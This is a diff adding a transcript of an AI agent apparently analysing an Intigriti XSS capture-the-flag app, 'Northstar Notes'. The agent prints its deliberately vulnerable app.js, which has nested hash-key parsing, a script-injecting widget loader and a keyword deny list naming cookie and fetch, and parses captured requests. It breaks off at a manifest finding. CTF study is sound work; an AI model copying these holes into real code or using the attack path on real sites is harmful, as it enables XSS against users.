@@ -3105,3 +3105,4414 @@ The server sets APP.panel = "reader", manifest returns your custom preset → fu
 
 Try several custom names: reader, custom, full, embed, share. The panel name just needs to match your readerPresets key AND not be a hardcoded panel.
 
+
+
+New Context:
+
+Clone CTF repobashcd /home/claude && git clone https://github.com/KarinaFromAespa/CTF 2>&1 | tail -5 && echo "---" && find CTF -type f | sortOutputCloning into 'CTF'...
+---
+CTF/.git/HEAD
+CTF/.git/config
+CTF/.git/description
+CTF/.git/hooks/applypatch-msg.sample
+CTF/.git/hooks/commit-msg.sample
+CTF/.git/hooks/fsmonitor-watchman.sample
+CTF/.git/hooks/post-update.sample
+CTF/.git/hooks/pre-applypatch.sample
+CTF/.git/hooks/pre-commit.sample
+CTF/.git/hooks/pre-merge-commit.sample
+CTF/.git/hooks/pre-push.sample
+CTF/.git/hooks/pre-rebase.sample
+CTF/.git/hooks/pre-receive.sample
+CTF/.git/hooks/prepare-commit-msg.sample
+CTF/.git/hooks/push-to-checkout.sample
+CTF/.git/hooks/sendemail-validate.sample
+CTF/.git/hooks/update.sample
+CTF/.git/index
+CTF/.git/info/exclude
+CTF/.git/logs/HEAD
+CTF/.git/logs/refs/heads/main
+CTF/.git/logs/refs/remotes/origin/HEAD
+CTF/.git/objects/pack/pack-457753d3af271f0d4216d6b218f79e60f9b3f5f6.idx
+CTF/.git/objects/pack/pack-457753d3af271f0d4216d6b218f79e60f9b3f5f6.pack
+CTF/.git/objects/pack/pack-457753d3af271f0d4216d6b218f79e60f9b3f5f6.rev
+CTF/.git/packed-refs
+CTF/.git/refs/heads/main
+CTF/.git/refs/remotes/origin/HEAD
+CTF/804576bc8115ce7477895a776ca331f0.har
+CTF/804576bc8115ce7477895a776ca331f0.xml
+CTF/CTF.xml
+CTF/Context.txt
+CTF/New.xml
+CTF/New1.xml
+CTF/app.js
+CTF/attrs.ts
+CTF/bot.js
+CTF/challenge.html
+CTF/purify.min.js
+CTF/purify.ts
+CTF/regexp.ts
+CTF/tags.ts
+CTF/utils.ts
+Let me look at the key files to understand the CTF.Read contextbashcat /home/claude/CTF/Context.txtOutputClone repo and read new XML
+bash
+
+cd /home/claude && git clone https://github.com/KarinaFromAespa/CTF 2>&1 | tail -3
+Output
+
+Cloning into 'CTF'...
+
+List files in cloned repo
+bash
+
+find /home/claude/CTF -type f | head -30 && echo "---" && ls /home/claude/CTF
+Output
+
+/home/claude/CTF/CTF.xml
+/home/claude/CTF/purify.ts
+/home/claude/CTF/utils.ts
+/home/claude/CTF/.git/info/exclude
+/home/claude/CTF/.git/HEAD
+/home/claude/CTF/.git/refs/heads/main
+/home/claude/CTF/.git/refs/remotes/origin/HEAD
+/home/claude/CTF/.git/logs/HEAD
+/home/claude/CTF/.git/logs/refs/heads/main
+/home/claude/CTF/.git/logs/refs/remotes/origin/HEAD
+/home/claude/CTF/.git/hooks/pre-receive.sample
+/home/claude/CTF/.git/hooks/pre-push.sample
+/home/claude/CTF/.git/hooks/fsmonitor-watchman.sample
+/home/claude/CTF/.git/hooks/pre-applypatch.sample
+/home/claude/CTF/.git/hooks/applypatch-msg.sample
+/home/claude/CTF/.git/hooks/push-to-checkout.sample
+/home/claude/CTF/.git/hooks/update.sample
+/home/claude/CTF/.git/hooks/prepare-commit-msg.sample
+/home/claude/CTF/.git/hooks/commit-msg.sample
+/home/claude/CTF/.git/hooks/pre-merge-commit.sample
+/home/claude/CTF/.git/hooks/pre-commit.sample
+/home/claude/CTF/.git/hooks/pre-rebase.sample
+/home/claude/CTF/.git/hooks/sendemail-validate.sample
+/home/claude/CTF/.git/hooks/post-update.sample
+/home/claude/CTF/.git/packed-refs
+/home/claude/CTF/.git/index
+/home/claude/CTF/.git/objects/pack/pack-0def4826c7b0db12d7f2aefd7480ca31ba1f701c.rev
+/home/claude/CTF/.git/objects/pack/pack-0def4826c7b0db12d7f2aefd7480ca31ba1f701c.idx
+/home/claude/CTF/.git/objects/pack/pack-0def4826c7b0db12d7f2aefd7480ca31ba1f701c.pack
+/home/claude/CTF/.git/config
+---
+CTF.xml
+app.js
+attrs.ts
+challenge.html
+purify.min.js
+purify.ts
+regexp.ts
+tags.ts
+utils.ts
+
+Read app.js
+bash
+
+cat /home/claude/CTF/app.js
+Output
+
+(function () {
+  'use strict';
+
+  var APP = window.__APP_INIT__ || {};
+
+  var DEFAULTS = {
+    maxNoteLength: 50000,
+    searchDebounce: 300,
+    apiBase: '/api'
+  };
+
+  var ACCOUNT_PREFERENCES_API = DEFAULTS.apiBase + '/account/preferences';
+
+  // Settings helpers.
+
+  function mergeFormData(target, source) {
+    if (!source || typeof source !== 'object') return target;
+    var keys = Object.keys(source);
+    for (var i = 0; i < keys.length; i++) {
+      var k = keys[i];
+      if (!Object.prototype.hasOwnProperty.call(source, k)) continue;
+      if (typeof source[k] === 'object' && source[k] !== null) continue;
+      target[k] = source[k];
+    }
+    return target;
+  }
+
+  function getOwnString(obj, key, fallback) {
+    if (Object.prototype.hasOwnProperty.call(obj, key) && typeof obj[key] === 'string') {
+      return obj[key];
+    }
+    return fallback;
+  }
+
+  function getOwnArray(obj, key) {
+    if (Object.prototype.hasOwnProperty.call(obj, key) && Array.isArray(obj[key])) {
+      return obj[key];
+    }
+    return [];
+  }
+
+  // Hash-based appearance preferences.
+
+  function setNestedValue(obj, path, value) {
+    var keys = path.replace(/\]/g, '').split('[');
+    var current = obj;
+    for (var i = 0; i < keys.length - 1; i++) {
+      var k = keys[i];
+      if (k === '__proto__') return;
+      if (
+        current[k] == null ||
+        (typeof current[k] !== 'object' && typeof current[k] !== 'function')
+      ) {
+        current[k] = {};
+      }
+      current = current[k];
+    }
+    var last = keys[keys.length - 1];
+    if (last !== '__proto__') {
+      current[last] = value;
+    }
+  }
+
+  function parseThemeParams() {
+    var hash = location.hash;
+    if (!hash || hash.length < 2) return;
+    var raw = hash.substring(1);
+    var pairs = raw.split('&');
+    var result = {};
+
+    for (var i = 0; i < pairs.length; i++) {
+      var idx = pairs[i].indexOf('=');
+      if (idx === -1) continue;
+      try {
+        var key = decodeURIComponent(pairs[i].substring(0, idx));
+        var val = decodeURIComponent(pairs[i].substring(idx + 1));
+        setNestedValue(result, key, val);
+      } catch (e) {
+        continue;
+      }
+    }
+
+    if (result.theme)  APP.theme  = result.theme;
+    if (result.font)   document.body.style.fontFamily = result.font;
+    if (result.accent) document.documentElement.style.setProperty('--accent', result.accent);
+    if (result.bg)     document.documentElement.style.setProperty('--bg-primary', result.bg);
+  }
+
+  // Remote layout manifest.
+
+  function applyRemoteProfile(profile) {
+    if (!profile || typeof profile !== 'object') return;
+
+    if (typeof profile.renderMode === 'string') {
+      APP.renderMode = profile.renderMode;
+    }
+
+    if (Array.isArray(profile.widgetTypes)) {
+      APP.widgetTypes = profile.widgetTypes
+        .filter(function (value) { return typeof value === 'string'; })
+        .slice(0, 8);
+    }
+
+    if (typeof profile.widgetSink === 'string') {
+      APP.widgetSink = profile.widgetSink;
+    }
+
+    if (typeof profile.theme === 'string') {
+      APP.theme = profile.theme;
+    }
+  }
+
+  function loadPanelManifest() {
+    if (typeof window.__NOTE_CONTENT__ !== 'string') {
+      return Promise.resolve();
+    }
+
+    var panel  = typeof APP.panel === 'string' ? APP.panel : 'summary';
+    var noteId = typeof APP.noteId === 'string' ? APP.noteId : '';
+    if (!noteId) return Promise.resolve();
+
+    var target = '/note/' + encodeURIComponent(noteId) + '/' + panel +
+      '/manifest.json?note=' + encodeURIComponent(noteId);
+
+    return fetch(target, {
+      headers: { 'Accept': 'application/json' }
+    })
+      .then(function (r) {
+        if (!r.ok) return null;
+        return r.json();
+      })
+      .then(function (data) {
+        if (data && data.profile) {
+          applyRemoteProfile(data.profile);
+        }
+      })
+      .catch(function () {});
+  }
+
+  // Content policies.
+
+  function loadContentPolicies() {
+    var mode = getOwnString(APP, 'renderMode', 'safe');
+    return {
+      allowForms:         mode === 'full',
+      allowIds:           mode === 'full',
+      allowDataAttrs:     mode === 'full',
+      enableEnhancements: mode === 'full'
+    };
+  }
+
+  // DOMPurify config.
+
+  function getSanitizeConfig() {
+    var cfg = {
+      ALLOWED_TAGS: [
+        'h1','h2','h3','h4','h5','h6',
+        'p','br','hr',
+        'b','i','u','em','strong','del','ins','sub','sup','mark',
+        'a','img',
+        'ul','ol','li',
+        'blockquote','code','pre','kbd','samp',
+        'table','caption','thead','tbody','tfoot','tr','th','td',
+        'span','div',
+        'figure','figcaption',
+        'abbr','cite','q','small','time','var',
+        'dl','dt','dd'
+      ],
+      ALLOWED_ATTR: [
+        'href','src','alt','title',
+        'class','style',
+        'target','rel',
+        'width','height',
+        'colspan','rowspan','scope',
+        'cite','datetime','lang','dir'
+      ],
+      ALLOW_DATA_ATTR: false
+    };
+
+    var policies = loadContentPolicies();
+
+    if (policies.allowForms) {
+      cfg.ALLOWED_TAGS = cfg.ALLOWED_TAGS.concat([
+        'form','input','select','option','textarea',
+        'label','fieldset','legend',
+        'details','summary','dialog',
+        'meter','progress','output'
+      ]);
+    }
+
+    if (policies.allowIds) {
+      cfg.ALLOWED_ATTR = cfg.ALLOWED_ATTR.concat([
+        'id','name','value','type','placeholder',
+        'for','method','action',
+        'checked','selected','disabled','readonly',
+        'required','pattern','autocomplete',
+        'rows','cols','wrap','maxlength','minlength',
+        'multiple','size','accept','list',
+        'open','tabindex','role',
+        'min','max','step','low','high','optimum',
+        'aria-label','aria-describedby'
+      ]);
+    }
+
+    if (policies.allowDataAttrs) {
+      cfg.ALLOW_DATA_ATTR = true;
+    }
+
+    return cfg;
+  }
+
+  function sanitize(html) {
+    if (typeof DOMPurify === 'undefined') return '';
+    return DOMPurify.sanitize(html, getSanitizeConfig());
+  }
+
+  // Post-sanitisation data attribute filter.
+
+  var UNSAFE_CONTENT_RE = /script|cookie|document|window|eval|alert|prompt|confirm|Function|fetch|XMLHttp|import|require|setTimeout|setInterval/i;
+
+  function postSanitize(html) {
+    var temp = document.createElement('div');
+    temp.innerHTML = html;
+    temp.querySelectorAll('*').forEach(function (el) {
+      var attrs = el.attributes;
+      for (var i = attrs.length - 1; i >= 0; i--) {
+        var attr = attrs[i];
+        if (attr.name.indexOf('data-') === 0 && UNSAFE_CONTENT_RE.test(attr.value)) {
+          el.removeAttribute(attr.name);
+        }
+      }
+    });
+    return temp.innerHTML;
+  }
+
+  // Note rendering.
+
+  function renderNoteContent() {
+    var display = document.getElementById('note-display');
+    var content = window.__NOTE_CONTENT__;
+    if (!display || typeof content !== 'string') return;
+
+    var clean = sanitize(content);
+    var safe  = postSanitize(clean);
+    display.innerHTML = safe;
+
+    display.querySelectorAll('a[href]').forEach(function (a) {
+      if (a.hostname !== location.hostname) {
+        a.setAttribute('rel', 'noopener noreferrer');
+        a.setAttribute('target', '_blank');
+      }
+    });
+
+    display.querySelectorAll('img').forEach(function (img) {
+      img.loading = 'lazy';
+      img.onerror = function () { this.style.display = 'none'; };
+    });
+  }
+
+  // Inline enhancements.
+
+  function initContentEnhancements() {
+    var container = document.getElementById('note-display');
+    if (!container) return;
+
+    var observer = new MutationObserver(function () {
+      processEnhancements(container);
+    });
+    observer.observe(container, { childList: true, subtree: true });
+  }
+
+  function processEnhancements(root) {
+    var policies = loadContentPolicies();
+    if (!policies.enableEnhancements) return;
+
+    var manifestTypes = getOwnArray(APP, 'widgetTypes');
+    if (!manifestTypes.length) return;
+
+    var configEl = document.getElementById('enhance-config');
+    if (!configEl) return;
+    var allowedTypes = (configEl.dataset.types || '').split(',');
+
+    root.querySelectorAll('[data-enhance]:not([data-processed])').forEach(function (el) {
+      el.dataset.processed = '1';
+      var type = el.dataset.enhance;
+      if (allowedTypes.indexOf(type) === -1) return;
+      if (manifestTypes.indexOf(type) === -1) return;
+
+      switch (type) {
+        case 'counter':
+          animateCounter(el);
+          break;
+        case 'progress':
+          animateProgress(el);
+          break;
+        case 'custom':
+          loadCustomWidget(el);
+          break;
+      }
+    });
+  }
+
+  function animateCounter(el) {
+    var target = parseInt(el.dataset.to || '100', 10);
+    var current = 0;
+    var step = Math.max(1, Math.floor(target / 60));
+    var timer = setInterval(function () {
+      current = Math.min(current + step, target);
+      el.textContent = current;
+      if (current >= target) clearInterval(timer);
+    }, 16);
+  }
+
+  function animateProgress(el) {
+    var pct = parseInt(el.dataset.pct || '0', 10);
+    el.style.width = '0%';
+    el.style.transition = 'width 1s ease';
+    requestAnimationFrame(function () {
+      el.style.width = Math.min(pct, 100) + '%';
+    });
+  }
+
+  function loadCustomWidget(el) {
+    if (getOwnString(APP, 'widgetSink', 'text') !== 'script') return;
+
+    var cfg = el.dataset.cfg;
+    if (!cfg || cfg.length > 512) return;
+    var s = document.createElement('script');
+    s.textContent = cfg;
+    document.head.appendChild(s);
+  }
+
+  // Search.
+
+  var searchTimer = null;
+
+  function initSearch() {
+    var input   = document.getElementById('search-input');
+    var results = document.getElementById('search-results');
+    if (!input || !results) return;
+
+    input.addEventListener('input', function () {
+      clearTimeout(searchTimer);
+      var q = this.value.trim();
+      if (q.length < 2) { results.innerHTML = ''; return; }
+
+      searchTimer = setTimeout(function () {
+        fetch(DEFAULTS.apiBase + '/search?q=' + encodeURIComponent(q))
+          .then(function (r) { return r.json(); })
+          .then(function (data) {
+            if (!data.results || !data.results.length) {
+              results.innerHTML = '<div class="no-results">No notes found</div>';
+              return;
+            }
+            results.innerHTML = data.results.map(function (n) {
+              return '<a href="/note/' + encodeURIComponent(n.id) +
+                     '" class="search-result">' + escapeHtml(n.title) + '</a>';
+            }).join('');
+          })
+          .catch(function () {
+            results.innerHTML = '<div class="no-results">Search failed</div>';
+          });
+      }, DEFAULTS.searchDebounce);
+    });
+  }
+
+  // Local note history.
+
+  var STORAGE_KEY = 'chainnotes_my_ids';
+
+  function getSavedIds() {
+    try {
+      var raw = localStorage.getItem(STORAGE_KEY);
+      if (!raw) return [];
+      var ids = JSON.parse(raw);
+      return Array.isArray(ids) ? ids : [];
+    } catch (e) {
+      return [];
+    }
+  }
+
+  function saveNoteId(id) {
+    var ids = getSavedIds();
+    if (ids.indexOf(id) === -1) {
+      ids.unshift(id);
+      if (ids.length > 200) ids = ids.slice(0, 200);
+      localStorage.setItem(STORAGE_KEY, JSON.stringify(ids));
+    }
+  }
+
+  function loadPrivateNotes() {
+    var grid  = document.getElementById('private-notes-grid');
+    var empty = document.getElementById('private-notes-empty');
+    if (!grid) return;
+
+    var ids = getSavedIds();
+    if (!ids.length) return;
+
+    fetch(DEFAULTS.apiBase + '/notes/lookup', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ ids: ids })
+    })
+      .then(function (r) { return r.json(); })
+      .then(function (data) {
+        if (!data.notes) return;
+        var found = data.notes.filter(function (n) { return n.found; });
+        if (!found.length) return;
+        if (empty) empty.style.display = 'none';
+        found.forEach(function (n) {
+          var a = document.createElement('a');
+          a.href = '/note/' + encodeURIComponent(n.id);
+          a.className = 'note-card';
+          var h3 = document.createElement('h3');
+          h3.textContent = n.title;
+          var span = document.createElement('span');
+          span.className = 'note-card-author';
+          span.textContent = n.author;
+          a.appendChild(h3);
+          a.appendChild(span);
+          grid.appendChild(a);
+        });
+      })
+      .catch(function () {});
+  }
+
+  // Note creation.
+
+  function initCreateForm() {
+    var form   = document.getElementById('create-form');
+    var result = document.getElementById('create-result');
+    if (!form) return;
+
+    form.addEventListener('submit', function (e) {
+      e.preventDefault();
+      var title   = form.querySelector('[name="title"]').value.trim();
+      var content = form.querySelector('[name="content"]').value;
+
+      if (!title || !content) {
+        showResult(result, 'error', 'Title and content are required.');
+        return;
+      }
+
+      fetch(DEFAULTS.apiBase + '/notes', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ title: title, content: content })
+      })
+        .then(function (r) { return r.json(); })
+        .then(function (data) {
+          if (data.success) {
+            saveNoteId(data.id);
+            showResult(result, 'success',
+              'Note created! <a href="' + escapeHtml(data.url) + '">View note &rarr;</a>');
+            form.reset();
+            loadPrivateNotes();
+          } else {
+            showResult(result, 'error', data.error || 'Failed to create note.');
+          }
+        })
+        .catch(function () {
+          showResult(result, 'error', 'Network error.');
+        });
+    });
+  }
+
+  // Settings.
+
+  function loadAccountPreferences() {
+    var form = document.getElementById('settings-form');
+    var meta = document.getElementById('settings-meta');
+
+    return fetch(ACCOUNT_PREFERENCES_API)
+      .then(function (r) { return r.json(); })
+      .then(function (data) {
+        if (!data || !data.preferences) return;
+
+        if (form) {
+          setFieldValue(form, 'theme', data.preferences.theme);
+          setFieldValue(form, 'fontSize', data.preferences.fontSize);
+          setFieldValue(form, 'language', data.preferences.language);
+          setFieldValue(form, 'defaultLayout', data.preferences.defaultLayout);
+        }
+
+        if (meta) {
+          var presetCount = data.stats && typeof data.stats.presetCount === 'number'
+            ? data.stats.presetCount
+            : 0;
+          meta.textContent = presetCount
+            ? presetCount + ' reader preset' + (presetCount === 1 ? '' : 's') + ' synced to this account.'
+            : 'Reader presets sync to this account automatically when they are created.';
+        }
+      })
+      .catch(function () {});
+  }
+
+  function initSettingsForm() {
+    var form   = document.getElementById('settings-form');
+    var result = document.getElementById('settings-result');
+    if (!form) return;
+
+    form.addEventListener('submit', function (e) {
+      e.preventDefault();
+      var payload = {};
+      new FormData(form).forEach(function (v, k) {
+        payload[k] = isNaN(v) ? v : Number(v);
+      });
+
+      var merged = {};
+      mergeFormData(merged, payload);
+
+      fetch(ACCOUNT_PREFERENCES_API, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(merged)
+      })
+        .then(function (r) { return r.json(); })
+        .then(function (data) {
+          if (data.success) {
+            if (data.preferences && typeof data.preferences.theme === 'string') {
+              APP.theme = data.preferences.theme;
+              applyTheme();
+            }
+            loadAccountPreferences();
+            showResult(result, 'success', 'Settings saved.');
+          } else {
+            showResult(result, 'error', data.error || 'Failed.');
+          }
+        })
+        .catch(function () {
+          showResult(result, 'error', 'Network error.');
+        });
+    });
+  }
+
+  // Review request.
+
+  function initReportButton() {
+    var btn    = document.getElementById('report-btn');
+    var result = document.getElementById('report-result');
+    if (!btn) return;
+
+    btn.addEventListener('click', function () {
+      btn.disabled = true;
+      var url = location.pathname + location.search + location.hash;
+
+      fetch(DEFAULTS.apiBase + '/report', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ url: url })
+      })
+        .then(function (r) { return r.json(); })
+        .then(function (data) {
+          showResult(result, data.success || data.message ? 'success' : 'error',
+            data.message || data.error);
+          setTimeout(function () { btn.disabled = false; }, 10000);
+        })
+        .catch(function () {
+          showResult(result, 'error', 'Network error.');
+          btn.disabled = false;
+        });
+    });
+  }
+
+  // Theme.
+
+  function applyTheme() {
+    document.documentElement.setAttribute('data-theme', APP.theme || 'dark');
+  }
+
+  // Utilities.
+
+  function setFieldValue(form, name, value) {
+    var field = form.querySelector('[name="' + name + '"]');
+    if (!field || value == null) return;
+    field.value = value;
+  }
+
+  function escapeHtml(str) {
+    var d = document.createElement('div');
+    d.textContent = str;
+    return d.innerHTML;
+  }
+
+  function showResult(el, type, msg) {
+    if (!el) return;
+    el.className = 'result-msg result-' + type;
+    el.innerHTML = msg;
+    el.style.display = 'block';
+    setTimeout(function () { el.style.display = 'none'; }, 8000);
+  }
+
+  // Init.
+
+  document.addEventListener('DOMContentLoaded', async function () {
+    parseThemeParams();
+    await loadPanelManifest();
+    applyTheme();
+    initContentEnhancements();
+    renderNoteContent();
+    initSearch();
+    initCreateForm();
+    initSettingsForm();
+    initReportButton();
+    loadPrivateNotes();
+    loadAccountPreferences();
+  });
+})();
+Now let me read the new XML file to understand the latest requests/responses.
+
+
+Parse New.xml to see all requests
+bash
+
+python3 -c "
+import xml.etree.ElementTree as ET
+import base64
+
+tree = ET.parse('/mnt/user-data/uploads/New.xml')
+root = tree.getroot()
+
+items = root.findall('.//item')
+print(f'Total items: {len(items)}')
+for i, item in enumerate(items):
+    url = item.findtext('url','')
+    status = item.findtext('status','')
+    method = item.findtext('method','')
+    print(f'[{i}] {method} {status} {url[:100]}')
+"
+Output
+
+Total items: 48
+[0] POST 200 https://challenge-0426.intigriti.io/api/report
+[1] GET 304 https://challenge-0426.intigriti.io/api/account/preferences
+[2] GET 304 https://challenge-0426.intigriti.io/note/ffae077a1ddd82a58b123d77a6a92909e9eb03d68c1e567a0761fd123ae
+[3] GET 200 https://challenge-0426.intigriti.io/note/ffae077a1ddd82a58b123d77a6a92909e9eb03d68c1e567a0761fd123ae
+[4] POST 200 https://challenge-0426.intigriti.io/api/report
+[5] POST 429 https://challenge-0426.intigriti.io/api/report
+[6] POST 429 https://challenge-0426.intigriti.io/api/report
+[7] POST 429 https://challenge-0426.intigriti.io/api/report
+[8] POST 429 https://challenge-0426.intigriti.io/api/report
+[9] GET 304 https://challenge-0426.intigriti.io/api/account/preferences
+[10] GET 304 https://challenge-0426.intigriti.io/note/ffae077a1ddd82a58b123d77a6a92909e9eb03d68c1e567a0761fd123ae
+[11] GET 200 https://challenge-0426.intigriti.io/note/ffae077a1ddd82a58b123d77a6a92909e9eb03d68c1e567a0761fd123ae
+[12] GET 304 https://challenge-0426.intigriti.io/api/account/preferences
+[13] GET 304 https://challenge-0426.intigriti.io/note/ffae077a1ddd82a58b123d77a6a92909e9eb03d68c1e567a0761fd123ae
+[14] GET 200 https://challenge-0426.intigriti.io/note/ffae077a1ddd82a58b123d77a6a92909e9eb03d68c1e567a0761fd123ae
+[15] GET 304 https://challenge-0426.intigriti.io/api/account/preferences
+[16] GET 304 https://challenge-0426.intigriti.io/note/ffae077a1ddd82a58b123d77a6a92909e9eb03d68c1e567a0761fd123ae
+[17] GET 200 https://challenge-0426.intigriti.io/note/ffae077a1ddd82a58b123d77a6a92909e9eb03d68c1e567a0761fd123ae
+[18] GET 304 https://challenge-0426.intigriti.io/api/account/preferences
+[19] GET 304 https://challenge-0426.intigriti.io/note/ffae077a1ddd82a58b123d77a6a92909e9eb03d68c1e567a0761fd123ae
+[20] GET 200 https://challenge-0426.intigriti.io/note/ffae077a1ddd82a58b123d77a6a92909e9eb03d68c1e567a0761fd123ae
+[21] POST 200 https://challenge-0426.intigriti.io/api/notes/lookup
+[22] GET 304 https://challenge-0426.intigriti.io/api/account/preferences
+[23] GET 200 https://challenge-0426.intigriti.io/challenge
+[24] GET 304 https://challenge-0426.intigriti.io/
+[25] POST 429 https://challenge-0426.intigriti.io/api/report
+[26] POST 429 https://challenge-0426.intigriti.io/api/report
+[27] POST 429 https://challenge-0426.intigriti.io/api/report
+[28] POST 429 https://challenge-0426.intigriti.io/api/report
+[29] GET 304 https://challenge-0426.intigriti.io/api/account/preferences
+[30] GET 200 https://challenge-0426.intigriti.io/note/ffae077a1ddd82a58b123d77a6a92909e9eb03d68c1e567a0761fd123ae
+[31] GET 200 https://challenge-0426.intigriti.io/note/ffae077a1ddd82a58b123d77a6a92909e9eb03d68c1e567a0761fd123ae
+[32] POST 200 https://challenge-0426.intigriti.io/api/report
+[33] POST 429 https://challenge-0426.intigriti.io/api/report
+[34] POST 429 https://challenge-0426.intigriti.io/api/report
+[35] POST 429 https://challenge-0426.intigriti.io/api/report
+[36] POST 429 https://challenge-0426.intigriti.io/api/report
+[37] POST 429 https://challenge-0426.intigriti.io/api/report
+[38] POST 429 https://challenge-0426.intigriti.io/api/report
+[39] POST 429 https://challenge-0426.intigriti.io/api/report
+[40] GET 304 https://challenge-0426.intigriti.io/api/account/preferences
+[41] GET 200 https://challenge-0426.intigriti.io/note/ffae077a1ddd82a58b123d77a6a92909e9eb03d68c1e567a0761fd123ae
+[42] GET 200 https://challenge-0426.intigriti.io/note/ffae077a1ddd82a58b123d77a6a92909e9eb03d68c1e567a0761fd123ae
+[43] GET 304 https://challenge-0426.intigriti.io/api/account/preferences
+[44] GET 200 https://challenge-0426.intigriti.io/note/ffae077a1ddd82a58b123d77a6a92909e9eb03d68c1e567a0761fd123ae
+[45] GET 200 https://challenge-0426.intigriti.io/note/ffae077a1ddd82a58b123d77a6a92909e9eb03d68c1e567a0761fd123ae
+[46] POST 200 https://challenge-0426.intigriti.io/api/notes/lookup
+[47] POST 200 https://challenge-0426.intigriti.io/api/notes
+
+Decode key responses from New.xml
+bash
+
+python3 -c "
+import xml.etree.ElementTree as ET
+import base64
+
+tree = ET.parse('/mnt/user-data/uploads/New.xml')
+root = tree.getroot()
+items = root.findall('.//item')
+
+# Look at the full URLs to see panels, and decode interesting responses
+for i in [3, 11, 14, 17, 20, 30, 31, 41, 42, 44, 45, 47]:
+    item = items[i]
+    url = item.findtext('url','')
+    status = item.findtext('status','')
+    # decode response
+    resp_el = item.find('response')
+    if resp_el is not None and resp_el.get('base64') == 'true':
+        try:
+            resp = base64.b64decode(resp_el.text).decode('utf-8', errors='replace')
+        except:
+            resp = resp_el.text or ''
+    else:
+        resp = resp_el.text if resp_el is not None else ''
+    
+    # Show URL and first 300 chars of response body (after headers)
+    body_start = resp.find('\r\n\r\n')
+    body = resp[body_start+4:body_start+500] if body_start != -1 else resp[:500]
+    print(f'=== [{i}] {status} {url[-80:]}')
+    print(body[:300])
+    print()
+"
+Output
+
+=== [3] 200 io/note/ffae077a1ddd82a58b123d77a6a92909e9eb03d68c1e567a0761fd123ae2a0b5/summary
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>XSS2 — Northstar Notes</title>
+  <link rel="stylesheet" href="/css/challenge-style.css">
+</head>
+<body>
+
+  <header class="topbar">
+    <nav>
+
+
+=== [11] 200 io/note/ffae077a1ddd82a58b123d77a6a92909e9eb03d68c1e567a0761fd123ae2a0b5/summary
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>XSS2 — Northstar Notes</title>
+  <link rel="stylesheet" href="/css/challenge-style.css">
+</head>
+<body>
+
+  <header class="topbar">
+    <nav>
+
+
+=== [14] 200 io/note/ffae077a1ddd82a58b123d77a6a92909e9eb03d68c1e567a0761fd123ae2a0b5/compact
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>XSS2 — Northstar Notes</title>
+  <link rel="stylesheet" href="/css/challenge-style.css">
+</head>
+<body>
+
+  <header class="topbar">
+    <nav>
+
+
+=== [17] 200 i.io/note/ffae077a1ddd82a58b123d77a6a92909e9eb03d68c1e567a0761fd123ae2a0b5/print
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>XSS2 — Northstar Notes</title>
+  <link rel="stylesheet" href="/css/challenge-style.css">
+</head>
+<body>
+
+  <header class="topbar">
+    <nav>
+
+
+=== [20] 200 tigriti.io/note/ffae077a1ddd82a58b123d77a6a92909e9eb03d68c1e567a0761fd123ae2a0b5
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>XSS2 — Northstar Notes</title>
+  <link rel="stylesheet" href="/css/challenge-style.css">
+</head>
+<body>
+
+  <header class="topbar">
+    <nav>
+
+
+=== [30] 200 ifest.json?note=ffae077a1ddd82a58b123d77a6a92909e9eb03d68c1e567a0761fd123ae2a0b5
+{"profile":{"renderMode":"safe","widgetTypes":[],"widgetSink":"text"}}
+
+=== [31] 200 io/note/ffae077a1ddd82a58b123d77a6a92909e9eb03d68c1e567a0761fd123ae2a0b5/compact
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>XSS2 — Northstar Notes</title>
+  <link rel="stylesheet" href="/css/challenge-style.css">
+</head>
+<body>
+
+  <header class="topbar">
+    <nav>
+
+
+=== [41] 200 ifest.json?note=ffae077a1ddd82a58b123d77a6a92909e9eb03d68c1e567a0761fd123ae2a0b5
+{"profile":{"renderMode":"safe","widgetTypes":["counter"],"widgetSink":"text","theme":"light"}}
+
+=== [42] 200 i.io/note/ffae077a1ddd82a58b123d77a6a92909e9eb03d68c1e567a0761fd123ae2a0b5/print
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>XSS2 — Northstar Notes</title>
+  <link rel="stylesheet" href="/css/challenge-style.css">
+</head>
+<body>
+
+  <header class="topbar">
+    <nav>
+
+
+=== [44] 200 ifest.json?note=ffae077a1ddd82a58b123d77a6a92909e9eb03d68c1e567a0761fd123ae2a0b5
+{"profile":{"renderMode":"safe","widgetTypes":["counter","progress"],"widgetSink":"text"}}
+
+=== [45] 200 tigriti.io/note/ffae077a1ddd82a58b123d77a6a92909e9eb03d68c1e567a0761fd123ae2a0b5
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>XSS2 — Northstar Notes</title>
+  <link rel="stylesheet" href="/css/challenge-style.css">
+</head>
+<body>
+
+  <header class="topbar">
+    <nav>
+
+
+=== [47] 200 https://challenge-0426.intigriti.io/api/notes
+{"success":true,"id":"ffae077a1ddd82a58b123d77a6a92909e9eb03d68c1e567a0761fd123ae2a0b5","url":"/note/ffae077a1ddd82a58b123d77a6a92909e9eb03d68c1e567a0761fd123ae2a0b5"}
+
+Critical finding! Now I can see the manifest responses:
+
+Item [30] - manifest for some panel: {"profile":{"renderMode":"safe","widgetTypes":[],"widgetSink":"text"}}
+
